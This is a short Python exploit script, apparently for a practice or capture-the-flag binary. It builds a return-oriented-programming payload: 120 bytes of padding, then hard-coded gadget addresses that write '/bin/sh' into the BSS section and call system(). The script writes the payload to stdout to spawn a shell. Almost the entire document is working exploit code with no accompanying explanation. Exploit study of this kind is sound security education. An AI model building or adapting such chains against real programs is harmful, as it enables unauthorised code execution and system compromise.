import sys

SYSTEM_ADDR = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
BINSH = b"/bin/sh\x00"

BSS = b"\x00\x00\x00\x00\x00\x40\x40\x30"[::-1]

#  __asm__("mov %rax, (%rdx); ret");
MEM_MOVE = b"\x00\x00\x00\x00\x00\x40\x11\x5a"[::-1]
# __asm__("pop %rdx; ret");
POP_RDX = b"\x00\x00\x00\x00\x00\x40\x11\x5e"[::-1]
# __asm__("pop %rax; ret");
POP_RAX = b"\x00\x00\x00\x00\x00\x40\x11\x60"[::-1]
# __asm__("pop %rdi; ret");
POP_RDI = b"\x00\x00\x00\x00\x00\x40\x11\x62"[::-1]

LOC_TO_RET = 120
GARBAGE = b"A" * LOC_TO_RET

PAYLOAD = GARBAGE
# write /bin/sh to BSS
PAYLOAD += POP_RAX
PAYLOAD += BINSH
PAYLOAD += POP_RDX
PAYLOAD += BSS
PAYLOAD += MEM_MOVE
# put into rdi
PAYLOAD += POP_RDI
PAYLOAD += BSS
# call system
PAYLOAD += SYSTEM_ADDR

sys.stdout.buffer.write(PAYLOAD)
